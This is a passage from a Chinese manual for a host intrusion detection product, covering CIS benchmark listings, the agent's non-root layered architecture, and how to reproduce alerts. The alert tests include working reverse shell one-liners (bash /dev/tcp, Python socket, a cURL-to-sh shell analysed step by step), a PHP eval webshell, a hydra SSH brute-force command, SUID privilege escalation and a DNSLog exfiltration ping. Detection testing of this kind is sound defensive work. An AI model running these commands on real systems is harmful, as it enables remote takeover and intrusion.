+2021-03-01 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS PostgreSQL 14 Benchmark 2021-10-27 79  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS PostgreSQL 9.5 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS PostgreSQL 9.6 Benchmark 80  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Red Hat Enterprise Linux 5 Benchmark v2.2.1 2020-12-22 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Red Hat Enterprise Linux 6 Benchmark 81  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Red Hat Enterprise Linux 7 Benchmark v3.1.1 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Red Hat Enterprise Linux 8 Benchmark 82  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS SUSE Linux Enterprise 11 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS SUSE Linux Enterprise 12 Benchmark 83  / 111
+
+2021-02-10 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS SUSE Linux Enterprise 15 Benchmark 2021-09-17 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS SUSE Linux Enterprise Server 11 Benchmark 84  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS SUSE Linux Enterprise Server 12 Benchmark 85  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Ubuntu 12.04 LTS Server Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Ubuntu 12.04 LTS Server Benchmark 86  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Ubuntu 14.04 LTS Server Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Ubuntu Linux 14.04 LTS Benchmark 87  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Ubuntu Linux 16.04 LTS Benchmark 2021-03-23 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Ubuntu Linux 18.04 LTS Benchmark 88  / 111
+
+2021-03-23 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Ubuntu Linux 20.04 LTS Benchmark 2021-04-01 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 Classified Protection Benchmark Classified Protection 89  / 111
+
+Common Baseline Chaitin 2020-04-28 标准号 标准号 标准名称 标准名称 发布日期 发布日期 实施日期 实施日期 链接 链接 GB/T 22240-2020 网络安全等级保护定级指南 2020-04-28 2020-11-01 查看 GB/T 25058-2019 网络安全等级保护实施指南 2019-08-30 2020-03-01 查看 GB/T 22239-2019 网络安全等级保护基本要求 2019-05-10 2019-12-01 查看 GB/T 28448-2019 网络安全等级保护测评要求 2019-05-10 2019-12-01 查看 GB/T 36627-2018 网络安全等级保护测试评估技术指南 2018-09-17 2019-04-01 查看 技术架构 技术架构 探针技术架构 探针技术架构 探针以非 root 权限运行，使用 capability 机制在安装阶段对相关操作进行授权，使探针具备安全监控的完整能力， 同时也可确保在运行阶段系统的稳定性和安全性不受影响。
+探针采用分层架构，由探针应用层提供资产清点、入侵检测、风险感知等安全业务能力；
+探针内核作为常驻程序持续运行，不实现实际的功能，只为上层提供调用接口。探针内核提供探针应用运行的基础 平台，屏蔽底层操作系统与硬件平台的差异性，合理分配资源供不用的安全应用使用，使探针业务应用运行在各自 的沙箱内，可有效控制探针异常风险。（注意，探针内核运行在操作系统用户态，与操作系统内核无关） 探针应用运行在探针内核之上，通过探针内核提供的接口实现资产清点、入侵检测、风险感知等安全业务能力。
+管理员可根据业务负载情况灵活分配允许探针使用的硬件资源，自定义探针对于 CPU 和内存的最大使用限制，控 制探针对于服务器的影响。
+入侵场景复现 入侵场景复现 什么是反弹Shell 90  / 111
+
+所谓反弹Shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转发到 控制端。反弹Shell与telnet，ssh等标准Shell对应，本质上是网络概念的客户端与服务端的角色反转。
+现在假设有两台机器，A机器为监听端，B机器为安装了本平台探针的受控端。在A机器上使用  nc 监听端口 nc -lvnp 12345 在B机器上执行如下命令均可反弹Shell bash >& /dev/tcp/{A机器的IP}/12345 0>&1 exec 196<>/dev/tcp/{A机器的IP}/12345; /bin/bash <&196 >&196 2>&196 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'{A 机器的IP}'",'7777'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(["/lib64/ld-linux -x86-64.so.2", "/bin/bash"])' 91  / 111
+
+此时在A机器上会收到B机器反弹的Shell，查看  入侵检测->反弹Shell 即可看到B机器的告警 什么是webshell webshell就是以  asp 、  php 、  jsp 或者  cgi 等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务 器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多危险操作。正因 如此，攻击者会将webshell当做后门程序使用，以达到控制网站服务器的目的。
+# 92  / 111
+
+由于主机安全管理平台的Webshell检测依赖现有的站点识别，如果仅为了测试，而并不希望在测试机器上搭建网站 业务，可以在  入侵检测->Webshell->策略配置 中增加额外扫描路径 在对应的机器上安装探针，并向已添加的扫描路径中(在本例中是  /var/www/html )写入webshell。以  php 为例，我 们写入下述代码到  evil.php 中 <?php eval ($_GET['a']) ?> 93  / 111
+
+间隔短暂的时候后，便可以在管理端查看到对应的webshell告警 什么是命令审计 所谓命令审计，指的是主机通过替换  Bash 或者捕获进程事件源，并根据已有的规则(非序列/序列)进行入侵检测。
+目前主机安全管理平台的命令审计主要分为两大类检测模式，一类是基于固定的事件源格式(包 括  exename ,  cmdline ,  pexename ,  pcmdline 等)进行细粒度的规则匹配，另外一类则是基于行为序列的高级狩 猎。
+# 94  / 111
+
+以  Linux 为例，命令审计针对  Linux 的规则非常丰富，具体可以查看  入侵检测->命令审计->可疑命令->策略配置 中 的  内置检测规则 假设现在我们想测试  命令包含常见网络扫描工具名称 这条规则，可以在安装了探针的机器上执行如下命令(探针机 器需要安装  nmap ) nmap -sS -v 127.0.0.1 检测结果如下图所示 95  / 111
+
+什么是恶意文件检测 故名思意，恶意文件涵盖了  C2 (远程控制)，  挖矿 ，  键盘记录 等多种类型恶意文件。 主机安全管理平台使用自 研的病毒引擎对探针机器上的可疑文件进行多维度检测，包括  Hash ，  API Tree 等 由于恶意文件通常来讲对机器都会产生损害，因此为了方便测试复现，开发团队提供了一个已进行无害化处理的恶 意文件(右键另存为可下载) linux_evil_elf_x64 linux_evil_elf_x86 准备一台安装了探针的Linux机器，根据机器架构(x86或x64)下载对应的无害化恶意文件(这里以x64为例)，执行如 下命令 ./linux_evil_elf_x64 什么是暴力破解 所谓暴力破解，指的是本地或远程，穷举服务的密码。这里的服务，涵盖了多种类型，如系统认证相关 的 ssh ，  rdp ，又或者是数据库相关的  mysql ,  redis ，或者是比较冷门的  ldap ,  svn 等 在一台安装了探针的A机器上，安装  hydra (  hydra 是一款暴力破解工具，支持多种类型服务的爆破)，这里 以  Ubuntu 为例 apt-get install hydra 安装完hydra后，下载密码字典附件(右键另存为可下载) top1000.txt 下载完成后，在  top1000.txt 所在目录执行如下命令 hydra -l root -P password.txt ssh://127.0.0.1 96  / 111
+
+随后在  入侵检测->暴力破解 中即可查看相关告警 什么是蜜罐诱捕 微蜜罐，是主机安全管理平台推出的一个用于构建威胁检测引力场的功能。该功能提供高交互与低交互两种蜜罐技 术方案，支持与第三方蜜罐系统联动，将攻击流量自动引流到第三方蜜罐入口，延缓攻击过程，实现内网横向流量 的深度监测。可全面记录蜜罐攻击流量，为后续的溯源分析提供有效依据。
+由于测试环境未必有支持联动的第三方蜜罐，因此本文档将讲述如何配置低交互蜜罐并触发相关检测。 首先进 入  蜜罐诱捕 的  策略配置 页面。
+# 97  / 111
+
+点击  添加规则 ，我们添加一条监听端口  12345 的测试规则 98  / 111
+
+在安装了探针的机器上(策略生效的机器)，执行如下命令 telnet 127.0.0.1 12345 99  / 111
+
+随后在告警页面即可看到相关告警 什么是本地提权 所谓本地提权，指的是通过系统错误配置/系统特性/内核漏洞等途径，将普通用户的权限提升到管理员权限， 在  Linux 中，管理员的特征是为  UID 为0。因此对应到提权的这个过程，其实就是将  UID 非0的用户提升到 为  UID 为0的用户 由于一般系统中未必具备提权的条件，因此开发团队编写了一个可从本地普通用户提权到管理员的二进制文件 powerup 下载文件到安装了探针的机器当中，然后执行如下命令 chmod +s powerup 这条命令的含义是，赋予  powerup 这个文件  s 权限位(代表普通用户也能用管理员权限执行该文件，本质上 是  SUID 提权) 执行  powerup ,即可从普通用户提权到管理员 ./powerup 100  / 111
+
+在告警页面可查看相关告警 什么是异常登录?
+异常登录指的是，在管理端制定了相应的登录检测策略后，满足策略条件的都会告警。 在企业当中，通常都会使 用堡垒机进行跳板登录，因此非堡垒机登录的情况均为可疑登录，这是一种常见的策略配置思路。
+在  入侵检测->异常登录 中配置相应的登录策略，此处我们为了方便复现，将凡是使用  bobi 账户登录的用户都标为 异常登录 然后我们使用其他机器远程登录安装了探针的机器(需要探针机器存在  bobi 用户且可登录) ssh bobi@test.machine.local 101  / 111
+
+在告警页面可查看对应结果 什么是网络异常 网络异常，是本平台推出的一项网络审计功能，它内置了威胁情报库，对于异常的dns解析，以及ip连接，都会产 生相应的告警。
+在安装了探针的机器上，执行如下命令 (DNSLog 是一种回显机制，常用于在某些漏洞无法回显但可以发起 DNS 请求的情况下，利用此方式外带数据，以 解决某些漏洞由于无回显而难以利用的问题。) ping evil.dnslog.cn 随后在告警页即可查看相应告警 其他技术文档 其他技术文档 主机安全开发避坑奇旅 主机安全开发避坑奇旅 作为主机安全类产品的核心组件，Agent 部署在需要保护的业务服务器内部，与管理中心通信，实现数据采 集、安全监控、任务推送等功能，任何像 HIDS、CWPP、EDR、EPP 产品都离不开这根定海神“针”。
+关于如何做好主机安全，业内前辈做过无数的梳理，本文将抛开主机安全本身，从主机安全产品 Agent 架构的三个 技术细节出发，旨在分享我司在主机安全管理平台产品开发过程中遇过的坑与部分解决问题的心得。
+Agent安全｜非 root 权限运行 102  / 111
+
+作为主机安全产品最核心的部分，Agent 面临的风险和挑战也最大；Agent 自身的任何异常都有可能影响到操作系 统稳定性，甚至产生严重的安全风险。因此Agent 的运行权限是大部分使用者最关心的问题之一。
+分享几个case root权限失守 我们分析了一些开源的主机安全项目，确实发现部分项目的 Agent 存在安全问题，可以通过漏洞 直接获取系统的 root权限。
+操作系统失常 Agent 业务复杂，难免会出bug，一旦行为不可控会直接影响操作系统的正常使用。
+Kernel panic Linux 本身也不是 100% 完美，基本上每个版本都有不少 bug。应用程序的正常行为一旦触发 Linux 的 bug，带来的可能是 kernel panic。
+纯旁路无污染的 Agent 操作 安全是为了辅助业务健康成长，任何不考虑业务连续性的安全方案都是耍流氓。研发团队组建初期就立下了一条铁 律: Agent 所有的操作均使用纯旁路、无污染的方式实现，侵入性强的技术方案永远不是我们的选择。
+业务负载 & Agent 自身安全双保障 主机安全管理平台Agent 以非 root 方式运行，一方面可以避免意外导致系统稳定性受到挑战，另一方面也是对于安 全性的有效保证。Linux 内核在 2.1 版本以后引入了 capability 机制，他打破了原有超级用户与普通用户严格区分 的限制，使普通用户也可以完成部分特权操作。 Agent 使用 capability 在探针安装阶段对 Agent进行授权，使 Agent 具有完整的对操作系统监控的能力。同时确保 Agent 在运行阶段即使发生异常，也不会做超出能力范围之外 的事情，从而保证了业务负载的稳定性和 Agent 自身的安全性。
+Agent 分层架构 Agent 作为长期运行在服务器上的后台程序，对稳定性的要求极高，代码足够精简、尽可能减少改动是必选项。考 虑到这一前提，我们将 Agent 从架构上划分了两部分：Agent 内核 内核和业务应用 业务应用。
+Agent 内核 内核是对一些与操作系统相关，与硬件平台相关的实现进一步抽象。研发团队提取了资产采集、风险感知、入侵检 测等业务功能所需的公共部分，组成 Agent 内核。Agent 内核作为常驻程序持续运行，不实现实际的业务功能，只 为上层提供调用接口。（注意，Agent 内核运行在操作系统用户态，与操作系统内核无关）。
+Agent 内核提供的主要硬核功能如下 提供对操作系统的访问接口 提供对操作系统的访问接口：业务应用无法直接访问操作系统，所有对操作系统的读写操作均需经过 Agent 内 核，如：进程访问能力，文件访问能力，网络访问能力，用户访问能力，容器访问能力等。
+提供对事件监控机制 提供对事件监控机制：事件监控是主机安全产品的核心能力，所有对入侵行为的审计都离不开事件监控。
+Agent 内核提供了一种叫做 “事件源”的接口，支持业务应用注册异步回调来实现对于操作系统关键事件的监 控，这些事件包括：执行命令、创建用户、用户登录、用户被修改、创建进程、进程被修改、进程退出、创建 文件、文件被修改、监听端口、发起网络连接、发起 DNS 请求、加载内核模块等。
+跨平台抽象 跨平台抽象：Agent 内核作为底层抽象，帮业务应用屏蔽所有平台相关的特性，使业务应用可以实现跨平台运 行的可能，而不用考虑 Windows、Linux、x86、x64、ARM 等不同平台带来的实际差异。
+提供对容器的访问接口 提供对容器的访问接口：抽象多种容器的底层机制，使业务应用的工作逻辑可以对容器生效。
+调度能力 调度能力：Agent 内核负责所有上层业务应用的运行调度，根据服务器状态与业务需求选择加载卸载业务应 用；合理分配资源，适当调整不同业务应用的优先级，使业务应用有序运行。
+# 103  / 111
+
+资源限制 资源限制：Agent 内核提供了业务应用在运行阶段对于 CPU、内存、网络、磁盘等硬件资源的限制能力。得 益于此机制，本管理平台产品可以向用户提供行业内独家的 CPU 与内存限制功能，可完全由使用者自定义探 针的资源使用阈值。
+沙箱隔离 沙箱隔离：不同的业务应用运行在不同的沙箱内，相互隔离，互不干扰，任何业务应用运行发生异常都不影响 Agent 整体的运行。
+业务应用 在Agent内核之上是业务应用，使用 golang 和 lua 开发，通过主动或被动的方式向 Agent 内核发起调用，最终实现 与操作系统进行交互，为产品直接提供相关的功能实现。
+CTLua 优秀的产品离不开高手如云的专业团队。研发技术团队近 40 人，根据工作内容的不同，分为 3 个小团队，分别是 研发、安全对抗、安全开发。
+纵观整个安全行业，大部分优秀的安全工程师都是 fullstack，搞渗透、搞逆向、写脚本样样精通。但作为 fullstack 的安全工程师普遍缺乏工程化的研发经验，虽然能随手写一个 100 行的脚本，但是很少有人能维护 100 万行代码 的大型项目。因此，组建一个安全水平较高的工程化研发团队极其困难，我们依然需要 fullstack 小伙伴与我们一同 实现梦想；并必须拥有一定的规范，确保代码质量。
+Lua 灾难 业务应用是体现产品安全价值的重要模块，业务复杂，代码量大。在立项初期，随着不断有新同事的加入，业务应 用的代码质量下降很快，模块划分不明确，代码逻辑结构混乱，开始出现一些实现层面的低级错误，比如写错变量 名，比如不检查错误等等。经过一段时间的思考和纠结，我们认为问题的根源在于 lua。lua 是一门很好的嵌入式脚 本语言，有非常广泛的应用，尤其是它的灵活性，是脚本语言很大的优势。但是过于灵活却会导致其很难组织大项 目，举几个典型的问题：
+函数传参与返回类型不确定，少传参、多传参、不传参、少返回、多返回、不返回等问题会导致大量低级错 误。
+table 结构可以同时表示 array 和 map，在与其他程序通信的过程中很容易造成类型误解。
+标准库太少，第三方轮子遍地走，缺乏标准化。
+缺乏 OO，使用技巧封装会大幅提升开发成本。
+这些是很多脚本语言都会面临的问题，这种现象如果任由其发展，最终势必会对项目的整体质量造成严重影响。为 了解决这些问题，javascript 有了 typescript，python 有了 python3，lua 也需要类似的东西，我们遇到的问题需要 从编程语言入手去解决。经过调研我们锁定了开源的 Teal-Lang，可以实现对 lua 代码的类型标注和语法检查，但 任然无法满足我们的所有需求，考虑再三，我们还是开发了 ctlua。
+CTLua 的落地 伴随着 ctlua 的诞生，安全开发团队还做了 3 件小事：
+开发标准库 开发标准库：避免大家反复造轮子，避免在不了解实现的情况下引入风险较高的第三方模块。
+统一架构设计的认知 统一架构设计的认知：如果写出来的代码或者设计的架构让人很难理解，那一定是存在问题的，优秀的设计必 然清晰简单，要拒绝黑魔法，绝不引入过渡的抽象。
+统一接口设计的思想 统一接口设计的思想：模块的接口需要足够友好，为其他开发者和测试工程师在调用和自动化测试的过程中提 供便利性。
+# 104  / 111
+
+然后就是迁移的过程，迁移原有的业务应用是一个渐进的过程，从我们写下第一个 ctlua 的函数开始，团队的小伙 伴很快就接受了 ctlua，代码质量在短时间内有了一个质的飞跃。截止目前，除了已经被废弃的模块，本管理平台 所有的业务应用均使用 ctlua 开发，之前遇到的问题很少有再发生。
+足够精简的代码和尽可能减少改动，确保 Agent 内核 & 业务应用架构下的 Agent 稳如磐石，为主机安全高效服务 提供坚实基础。
+结语 主机安全作为内网安全的最后一道防线，是一线安全工程师一致认可的重要安全业务。我司主机安全团队从 2018 年写下第一行代码，到 2020 年正式发布商业化版本，已经有了足够的技术积累，感谢在过去不到一年的时间内数 十家付费客户对产品的认可。开发安全产品是一条艰辛且漫长的道路，持续优化迭代，将产品的安全能力为甲方赋 能是对客户最好的回馈。
+大型工程的建设必然会遇到不断的技术挑战，上文只是在管理平台Agent 开发过程中遇到的零光片羽，我们全体研 发人员始终会以开放的态度朝着最优方案的方向努力，同时诚邀各路大佬与我们在这趟奇旅之中，共筑安全梦想 （这其实是一条招聘广告）。
+cURL 反弹 反弹 Shell 命令原理 命令原理 cURL 是一款开源命令行工具，用于向指定 URL 发送数据并接收返回结果，常用于下载文件、请求基于 HTTP 协 议的 API 接口等。
+cURL 结合 Linux 和 Bash 的一些特性也可用于反弹 Shell。命令如下：
+{ curl -sNkT . https://$LHOST:$LPORT </dev/fd/3| sh 3>&-;} 3>&1|:
+该反弹 Shell 命令较为复杂，本文将逐步解析该命令，分析它的工作原理。
+cURL 参数 执行  man curl  命令可以查询到该反弹 Shell 命令中 cURL 各个参数的含义，整理后列举如下：
+-s, --silent：不显示进度或错误信息。但仍会传输指定数据或输出内容到  stdout 。
+-N, --no-buffer：禁用输出流的缓冲功能。正常情况下，cURL 会使用一个标准的缓冲输出流，它的作用是将数 据分块输出，而不是数据到达后立即输出。可使用该选项禁用这种缓冲。
+-k, --insecure：忽略证书错误。
+-T, --upload-file ：上传指定本地文件到远程 URL。可用
+-  做文件名以从  stdin  读取文件内容；也可用  .  做
+文件名，以非阻塞模式从  stdin  读取文件内容。非阻塞模式是指可从  stdin  读取文件内容的同时读取服务端 输出。
+Bash 特性 冒号 该反弹 Shell 命令的最后一个字符——冒号——是一个 Bash 内置命令，执行  man bash  命令查看手册可以找到如 下的说明：
+# 105  / 111
+
+: [参数] 无效；除了扩展参数和执行任何指定的重定向外，该命令没有任何作用。返回的退出码为 0。
+花括号 该反弹 Shell 命令中花括号的用法是命令组，可以在花括号中写多条命令，这些命令构成一个命令组，花括号后的 重定向将对命令组中所有命令生效。
+例如执行如下命令：
+{ echo 1 ; echo 2 ; } > out.txt 会发现屏幕没有任何输出，  out.txt  的内容是：
+可见两条  echo  命令的标准输出都被重定向到了文件  out.txt 。
+需要注意的是，命令组中最后一条命令的后面也需要添加分号，以明确标识命令结束，否则 Bash 的语法解析器将 无法正确解析。
+另外，命令组的重定向优先级低于组内命令自身的重定向。例如执行如下命令：
+{ echo 1 > inner.txt ; echo 2 ; } > outer.txt 会发现第一个  echo  命令的输出被重定向到了  inner.txt ，而不是  outer.txt 。
+Linux 特性 /dev/fd/ /dev/fd/  是指向  /proc/self/fd  的软链接。
+$ ls -l /dev/fd lrwxrwxrwx 1 root root 13 Jan 30 12:23 /dev/fd -> /proc/self/fd /proc/self  是一个特殊的软链接。当有进程查询该软链接的值时，Linux 内核会将  /proc/self  指向  /proc/<该进程的 PID> 。
+语法分析 为理解该反弹 Shell 命令，我们先对其进行语法分析。
+该反弹 Shell 命令被倒数第二个字符  |  （管道）分为前后两部分，如下图所示。
+# 106  / 111
+
+|       |
+|   |   |
+|       |
+|   |
++-----------------------------------------------------------------+      |   |       +-------+
+|                                                                 |      |   |       |       |
+| { curl -sNkT . https://$LHOST:$LPORT </dev/fd/3| sh 3>&-;} 3>&1 +------+   +-------+   :   |
+|                                                                 |                  |       |
++-----------------------------------------------------------------+                  +-------+ 前半部分是写在花括号中的命令组，命令组中包含由管道连接的两条命令，如下图所示。
+|       |
+|   |   |
+|       |
+|   |
++------------+      |   |       +-------+
+|            |      |   |       |       |
+| {...} 3>&1 +------+   +-------+   :   |
+|            |                  |       |
++------+-----+                  +-------+
+|
++------+-----+
+|            |
+|      |     |
+|            |
+|   |
+|   +-------------------------------------+
+|                                         |
++-----------------+------------------------------+    +-----+----+
+|                                                |    |          |
+|  curl -sNkT . https://$LHOST:$LPORT </dev/fd/3 |    | sh 3>&-; |
+|                                                |    |          |
++------------------------------------------------+    +----------+ fd 重定向分析 完成语法分析后来对 fd 重定向情况进行分析。
+假设执行这条命令的 Bash 的  stdin  和  stdout  都是  pts/0 。外层  | （倒数第二个字符）产生的匿名管道为
+pipe1 ，内层  | （cURL 和 sh 之间的管道）产生的匿名管道为  pipe2 。
+可标注出外层  |  前后命令的 fd 如下图所示。
+# 107  / 111
+
+|       |
+|   |   |
+|       |
+|   |
++-----------------------------------------------------------------+      |   |       +-------+
+|                                                                 |      |   |       |       |
+| { curl -sNkT . https://$LHOST:$LPORT </dev/fd/3| sh 3>&-;} 3>&1 +------+   +-------+   :   |
+|                                                                 |                  |       |
++-----------------------------------------------------------------+                  +-------+
+stdin : pts/0                                              stdin : pipe1
+stdout: pipe1                                              stdout: pts/0 命令组后的  3>&1  将 fd 3 重定向到了 fd 1，即  stdout ，如下图所示。
+|       |
+|   |   |
+|       |
+|   |
++------------------------------------------------------------+      |   |       +-------+
+|                                                            |      |   |       |       |
+| { curl -sNkT . https://$LHOST:$LPORT </dev/fd/3| sh 3>&-;} +------+   +-------+   :   |
+|                                                            |                  |       |
++------------------------------------------------------------+                  +-------+
+stdin : pts/0                                         stdin : pipe1
+stdout: pipe1                                         stdout: pts/0 fd 3  : pipe1 命令组中的命令会继承  {}  的 fd，同时命令组中两条命令也由一个管道连接，综合这两点可标注出 cURL 和 sh 的 fd 如下图所示。
+# 108  / 111
+
+|       |
+|   |   |
+|       |
+|   |
++------------+      |   |       +-------+
+stdin : pts/0  |            |      |   |       |       |
+stdout: pipe1  | {...} 3>&1 +------+   +-------+   :   |
+fd 3  : pipe1  |            |                  |       |
++------+-----+                  +-------+
+|
++------+-----+                 stdin : pipe1
+|            |                 stdout: pts/0
+|      |     |
+|            |
+|   |
+|   +-------------------------------------+
+|                                         |
++-----------------+------------------------------+    +-----+----+
+|                                                |    |          |
+|  curl -sNkT . https://$LHOST:$LPORT </dev/fd/3 |    | sh 3>&-; |
+|                                                |    |          |
++------------------------------------------------+    +----------+
+stdin : pts/0                         stdin : pipe2
+stdout: pipe2                         stdout: pipe1 fd 3  : pipe1                         fd 3  : pipe1 cURL 和 sh 各自又有一个重定向。cURL 的  </dev/fd/3  表示把  stdin  重定向为 fd 3，即  pipe1 。sh 的  3>&-  表 示关闭 fd 3。考虑到这两个重定向，最后可得到下图。
+# 109  / 111
+
+|       |
+|   |   |
+|       |
+|   |
++------------+      |   |       +-------+
+stdin : pts/0  |            |      |   |       |       |
+stdout: pipe1  | {...} 3>&1 +------+   +-------+   :   |
+fd 3  : pipe1  |            |                  |       |
++------+-----+                  +-------+
+|
++------+-----+                 stdin : pipe1
+|            |                 stdout: pts/0
+|      |     |
+|            |
+|   |
+|   +-------------------------------------+
+|                                         |
++-----------------+--------------------+              +-----+----+
+|                                      |              |          |
+|  curl -sNkT . https://$LHOST:$LPORT  |              |    sh    |
+|                                      |              |          |
++--------------------------------------+              +----------+
+stdin : pipe1                          stdin : pipe2
+stdout: pipe2                          stdout: pipe1 fd 3  : pipe1 从上图可以很清晰地看出，cURL 的  stdin  和 sh 的  stdout 、 sh 的  stdin  和 cURL 的  stdout  分别通过匿名管 道  pipe1  和  pipe2  相连。
+总结 该反弹 Shell 命令利用 Bash 的命令组、管道和重定向等特性让 cURL 命令和 sh 命令的  stdin  和  stdout  交错相 连；通过为 cURL 添加  -T  等参数和文件名  .  让 cURL 读取  stdin  的内容发送到服务端，同时读取服务端返回 的数据并输出到  stdout 。
+机器码计算方式 机器码计算方式 在云环境中，探针会调用云厂商提供的 API 接口，获取云主机实例 ID 作为机器码。
+在非云环境中，探针会读取多种硬件特征，根据硬件特征计算机器码。探针会读取 SMBIOS（系统管理 BIOS） 的 以下字段来计算机器码：
+BIOSVendor SystemManufacturer 110  / 111
+
+SystemProductName SystemVersion SystemSerialNumber SystemUUID SystemSKUNumber SystemFamily BaseboardManufacturer BaseboardProductName BaseboardVersion BaseboardSerialNumber ChassisManufacturer ChassisType ChassisVersion ChassisSerialNumber 在 Linux 中，读取 SMBIOS 可能会失败，这时探针将读取磁盘序列号来计算机器码；如果读取磁盘序列号也失 败，探针将读取网卡 MAC 地址来计算机器码。
+# 111  / 111
